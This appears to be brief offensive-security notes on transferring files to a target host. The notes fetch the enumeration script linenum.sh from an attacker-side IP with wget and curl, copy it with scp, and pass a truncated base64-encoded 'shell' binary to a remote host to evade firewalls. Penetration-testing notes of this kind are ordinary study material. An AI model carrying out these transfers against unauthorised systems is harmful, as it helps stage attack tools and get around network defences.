## FileTransfers

### Python server

python3 -m http.server 8000
wget http://10.10.14.1:8000/linenum.sh
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

### scp

scp linenum.sh user@remotehost:/tmp/linenum.sh

### Base64(evade firewall)

In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it.

base64 shell -w 0

copy base 64 string to remote host

echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

